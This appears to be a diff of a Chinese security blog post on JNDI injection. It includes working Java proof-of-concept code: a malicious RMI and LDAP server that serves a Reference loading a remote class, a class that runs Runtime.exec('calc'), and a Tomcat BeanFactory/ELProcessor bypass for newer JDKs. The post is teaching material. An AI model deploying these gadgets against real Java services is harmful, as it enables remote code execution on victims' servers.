-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Reference;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDILDAPServer</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        Reference refObj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference(<span style="color:#e6db74">&#34;CalcRef&#34;</span>, <span style="color:#e6db74">&#34;CalcRef&#34;</span>, <span style="color:#e6db74">&#34;http://127.0.0.1:1088/&#34;</span>);
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        initialContext.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&#34;</span>, refObj);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDILDAPClient</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        initialContext.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="jndi-jdk高版本注入">JNDI jdk高版本注入<a hidden class="anchor" aria-hidden="true" href="#jndi-jdk高版本注入">#</a></h2>
-<h3></h3>
-<p>需要添加tomcat相关依赖，pom.xml：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependencies&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.tomcat.embed<span style="color:#f92672">&lt;/groupId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>tomcat-embed-core<span style="color:#f92672">&lt;/artifactId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>8.5.71<span style="color:#f92672">&lt;/version&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>javax.el<span style="color:#f92672">&lt;/groupId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>javax.el-api<span style="color:#f92672">&lt;/artifactId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>3.0.0<span style="color:#f92672">&lt;/version&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>org.glassfish<span style="color:#f92672">&lt;/groupId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>javax.el<span style="color:#f92672">&lt;/artifactId&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>3.0.0<span style="color:#f92672">&lt;/version&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependencies&gt;</span>
-</span></span></code></pre></div><p>JNDIRMIServerHighBypass.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.naming.ResourceRef;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.StringRefAddr;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDIRMIServerHighBypass</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(1099);
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        ResourceRef resourceRef <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResourceRef(<span style="color:#e6db74">&#34;javax.el.ELProcessor&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;org.apache.naming.factory.BeanFactory&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        resourceRef.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;forceString&#34;</span>, <span style="color:#e6db74">&#34;x=eval&#34;</span>));
-</span></span><span style="display:flex;"><span>        resourceRef.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;Runtime.getRuntime().exec(&#39;calc&#39;)&#34;</span>));
-</span></span><span style="display:flex;"><span>        initialContext.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, resourceRef);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div>
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>JNDI注入 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="JNDI注入 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/web/jndiinjection/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/web/jndiinjection/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/web/jndiinjection/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="JNDI注入"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-09T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-09T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="JNDI注入"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"WEB","item":"https://blog.w8nn9z.top/posts/web/"},{"@type":"ListItem","position":3,"name":"JNDI注入","item":"https://blog.w8nn9z.top/posts/web/jndiinjection/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"JNDI注入","name":"JNDI注入","description":"","keywords":[],"articleBody":"JNDI与RMI、LDAP的关系 JNDI (Java Naming and Directory Interface)：是一个接口，一个统一的查询标准，本身不提供服务，只提供一套标准的API来查找东西\nRMI (Remote Method Invocation) 和 LDAP (Lightweight Directory Access Protocol)：是具体的服务，是两种不同类型的实现。它们是真正存储信息、提供对象的地方\nRMI 实现 远程接口 IRmoteObj.java：\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface IRmoteObj extends Remote { String sayHello(String name) throws RemoteException; } 服务器对象实现 RmoteObjImpl.java：\nimport java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RmoteObjImpl extends UnicastRemoteObject implements IRmoteObj{ public RmoteObjImpl() throws RemoteException { super(); } @Override public String sayHello(String name) throws RemoteException { System.out.println(\"sayHello\"); return name; } } 服务器注册和绑定 RMIServer.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws Exception { RmoteObjImpl remoteObj = new RmoteObjImpl(); Registry registry = LocateRegistry.createRegistry(1099); registry.rebind(\"remoteObj\", remoteObj); } } 客户端查找和调用 RMIClient.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); IRmoteObj remoteObj = (IRmoteObj) registry.lookup(\"remoteObj\"); System.out.println(remoteObj.sayHello(\"hello\")); } } JNDI RMI 实现 JNDIRMIServer.java：\nimport javax.naming.InitialContext; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", remoteObj); } } JNDIRMIClinet.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\"rmi://127.0.0.1:1099/remoteObj\"); System.out.println(remoteObj.sayHello(\"hello\")); } } JNDI RMI 注入 攻击者在自己服务器上构造恶意的JNDI RMI服务，JNDIRMIServer.java：\nimport javax.naming.InitialContext; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); // RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); // initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", remoteObj); Reference refObj = new Reference(\"CalcRef\", \"CalcRef\", \"http://127.0.0.1:1088/\"); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", refObj); } } CalcRef.java：\nimport java.io.IOException; public class CalcRef { public CalcRef() throws IOException { Runtime.getRuntime().exec(\"calc\"); } } 同时要求JNDIRMIClient端lookup参数可控，JNDIRMIClient.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\"rmi://127.0.0.1:1099/remoteObj\"); // 此处应是攻击者ip System.out.println(remoteObj.sayHello(\"hello\")); } } Java 8u121+ (包括 Java 9, 11, 17, 21 等): Oracle 引入了安全补丁，将 com.sun.jndi.rmi.object.trustURLCodebase 默认设置为 false。这直接阻止了 JVM 从 Codebase URL 加载远程类，使 RMI 协议的 JNDI 注入几乎无法利用\nJNDI LADP 注入 import javax.naming.InitialContext; import javax.naming.Reference; public class JNDILDAPServer { public static void main(String[] args) throws Exception { Reference refObj = new Reference(\"CalcRef\", \"CalcRef\", \"http://127.0.0.1:1088/\"); InitialContext initialContext = new InitialContext(); initialContext.rebind(\"ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\", refObj); } } import javax.naming.InitialContext; public class JNDILDAPClient { public static void main(String[] args) throws Exception { InitialContext initialContext = new InitialContext(); initialContext.lookup(\"ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\"); } } JNDI jdk高版本注入 需要添加tomcat相关依赖，pom.xml：\norg.apache.tomcat.embed tomcat-embed-core 8.5.71 javax.el javax.el-api 3.0.0 org.glassfish javax.el 3.0.0 JNDIRMIServerHighBypass.java：\nimport org.apache.naming.ResourceRef; import javax.naming.InitialContext; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; public class JNDIRMIServerHighBypass { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); InitialContext initialContext = new InitialContext(); ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", null); resourceRef.add(new StringRefAddr(\"forceString\", \"x=eval\")); resourceRef.add(new StringRefAddr(\"x\", \"Runtime.getRuntime().exec('calc')\")); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", resourceRef); } } ","wordCount":"879","inLanguage":"en","datePublished":"2025-10-09T00:00:00Z","dateModified":"2025-10-09T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/web/jndiinjection/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">JNDI注入</h1><div class=post-meta><span title='2025-10-09 00:00:00 +0000 UTC'>October 9, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#jndi%e4%b8%8ermildap%e7%9a%84%e5%85%b3%e7%b3%bb aria-label=JNDI与RMI、LDAP的关系>JNDI与RMI、LDAP的关系</a></li><li><a href=#rmi-%e5%ae%9e%e7%8e%b0 aria-label="RMI 实现">RMI 实现</a></li><li><a href=#jndi-rmi-%e5%ae%9e%e7%8e%b0 aria-label="JNDI RMI 实现">JNDI RMI 实现</a></li><li><a href=#jndi-rmi-%e6%b3%a8%e5%85%a5 aria-label="JNDI RMI 注入">JNDI RMI 注入</a></li><li><a href=#jndi-ladp-%e6%b3%a8%e5%85%a5 aria-label="JNDI LADP 注入">JNDI LADP 注入</a></li><li><a href=#jndi-jdk%e9%ab%98%e7%89%88%e6%9c%ac%e6%b3%a8%e5%85%a5 aria-label="JNDI jdk高版本注入">JNDI jdk高版本注入</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=jndi与rmildap的关系>JNDI与RMI、LDAP的关系<a hidden class=anchor aria-hidden=true href=#jndi与rmildap的关系>#</a></h2><p>JNDI (Java Naming and Directory Interface)：是一个接口，一个统一的查询标准，本身不提供服务，只提供一套标准的API来查找东西</p><p>RMI (Remote Method Invocation) 和 LDAP (Lightweight Directory Access Protocol)：是具体的服务，是两种不同类型的实现。它们是真正存储信息、提供对象的地方</p><h2 id=rmi-实现>RMI 实现<a hidden class=anchor aria-hidden=true href=#rmi-实现>#</a></h2><p>远程接口 IRmoteObj.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Remote;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>IRmoteObj</span> <span style=color:#66d9ef>extends</span> Remote {
+</span></span><span style=display:flex><span>    String <span style=color:#a6e22e>sayHello</span>(String name) <span style=color:#66d9ef>throws</span> RemoteException;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>服务器对象实现 RmoteObjImpl.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.server.UnicastRemoteObject;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RmoteObjImpl</span> <span style=color:#66d9ef>extends</span> UnicastRemoteObject <span style=color:#66d9ef>implements</span> IRmoteObj{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>RmoteObjImpl</span>() <span style=color:#66d9ef>throws</span> RemoteException {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>sayHello</span>(String name) <span style=color:#66d9ef>throws</span> RemoteException {
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;sayHello&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> name;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>服务器注册和绑定 RMIServer.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.Registry;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RMIServer</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        RmoteObjImpl remoteObj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RmoteObjImpl();
+</span></span><span style=display:flex><span>        Registry registry <span style=color:#f92672>=</span> LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(1099);
+</span></span><span style=display:flex><span>        registry.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;remoteObj&#34;</span>, remoteObj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>客户端查找和调用 RMIClient.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.Registry;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RMIClient</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        Registry registry <span style=color:#f92672>=</span> LocateRegistry.<span style=color:#a6e22e>getRegistry</span>(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, 1099);
+</span></span><span style=display:flex><span>        IRmoteObj remoteObj <span style=color:#f92672>=</span> (IRmoteObj) registry.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;remoteObj&#34;</span>);
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(remoteObj.<span style=color:#a6e22e>sayHello</span>(<span style=color:#e6db74>&#34;hello&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=jndi-rmi-实现>JNDI RMI 实现<a hidden class=anchor aria-hidden=true href=#jndi-rmi-实现>#</a></h2><p>JNDIRMIServer.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDIRMIServer</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(1099);
+</span></span><span style=display:flex><span>        RmoteObjImpl remoteObj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RmoteObjImpl();
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        initialContext.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, remoteObj);
